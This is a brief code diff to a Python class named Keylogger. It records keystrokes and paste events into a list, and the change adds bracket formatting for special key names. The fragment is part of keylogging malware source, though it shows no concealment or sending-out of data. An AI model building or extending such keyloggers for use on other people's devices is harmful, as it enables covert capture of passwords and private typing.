@@ -22,6 +22,8 @@ class Keylogger(object):
         keyboard.add_hotkey('ctrl+v', self._on_paste)
 
     def _on_key_press(self, event):
+        if len(event.name) > 1:
+            event.name = '[{}]'.format(event.name)
         self.captured_keys.append(event.name)
 
     def _on_paste(self):
